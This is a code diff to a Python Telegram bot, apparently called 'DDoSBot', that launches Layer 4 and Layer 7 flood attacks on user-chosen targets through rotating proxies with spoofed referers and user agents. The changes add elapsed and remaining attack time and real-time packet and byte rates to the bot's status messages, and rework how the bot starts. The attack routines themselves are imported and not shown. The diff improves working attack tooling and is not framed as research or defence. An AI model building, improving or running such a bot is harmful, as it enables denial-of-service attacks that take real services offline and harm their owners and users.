@@ -2,13 +2,13 @@ import telebot
 import asyncio
 from threading import Thread
 import socket
-from time import sleep
+from time import time, sleep
 from proxy_manager import ProxyManager
 from attack_methods import Layer4Attack, Layer7Attack
 import json
 import logging
 import psutil
-from utils import humanbytes
+from utils import humanbytes, format_time
 
 logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', level=logging.INFO)
 logger = logging.getLogger("DDoSBot")
@@ -53,14 +53,18 @@ def format_status(attack):
     global spinner_idx
     spinner = SPINNER[spinner_idx % len(SPINNER)]
     spinner_idx += 1
+    elapsed_time = time() - attack.start_time if attack.start_time else 0
+    remaining_time = max(0, attack.duration - elapsed_time)
     return (
         f"🔥 *Attack Status* {spinner} 🔥\n"
         f"🎯 *Target*: `{attack.target}`\n"
         f"⚙️ *Method*: `{attack.method}`\n"
+        f"⏳ *Elapsed Time*: `{format_time(elapsed_time)}`\n"
+        f"⏰ *Remaining Time*: `{format_time(remaining_time)}`\n"
         f"📤 *Bytes Sent*: `{humanbytes(attack.bytes_sent)}`\n"
         f"📦 *Requests Sent*: `{attack.requests_sent}`\n"
-        f"🚀 *PPS*: `{attack.requests_sent // max(1, int(attack.duration / 5))}`/s\n"
-        f"📊 *BPS*: `{humanbytes(attack.bytes_sent // max(1, int(attack.duration / 5)))}`/s\n"
+        f"🚀 *PPS*: `{attack.requests_sent // max(1, int(elapsed_time))}`/s\n"
+        f"📊 *BPS*: `{humanbytes(attack.bytes_sent // max(1, int(elapsed_time)))}`/s\n"
         f"🖥️ *CPU Usage*: `{psutil.cpu_percent()}%`\n"
         f"💾 *Memory Usage*: `{psutil.virtual_memory().percent}%`\n"
         f"🔗 *Proxies*: `{len(proxies)}`"
@@ -106,7 +110,7 @@ def attack(message):
             f"✅ *Attack Launched* ✅\n"
             f"🎯 *Target*: `{target}`\n"
             f"⚙️ *Method*: `{method}`\n"
-            f"⏳ *Duration*: `{duration}s`\n"
+            f"⏳ *Duration*: `{format_time(duration)}`\n"
             f"🧵 *Threads*: `{attack.threads}`"
         ), parse_mode="Markdown")
         message_ids[message.chat.id] = msg.message_id
@@ -144,8 +148,11 @@ def proxies_cmd(message):
         asyncio.run(load_proxies())
     bot.reply_to(message, f"🔗 *Working Proxies*: `{len(proxies)}`", parse_mode="Markdown")
 
-if __name__ == "__main__":
-    asyncio.create_task(load_proxies())
-    load_referers_and_user_agents()  # Load referers và user agents khi khởi động
+async def main():
+    await load_proxies()
+    load_referers_and_user_agents()
     logger.info("Bot started.")
     bot.polling(none_stop=True)
+
+if __name__ == "__main__":
+    asyncio.run(main())
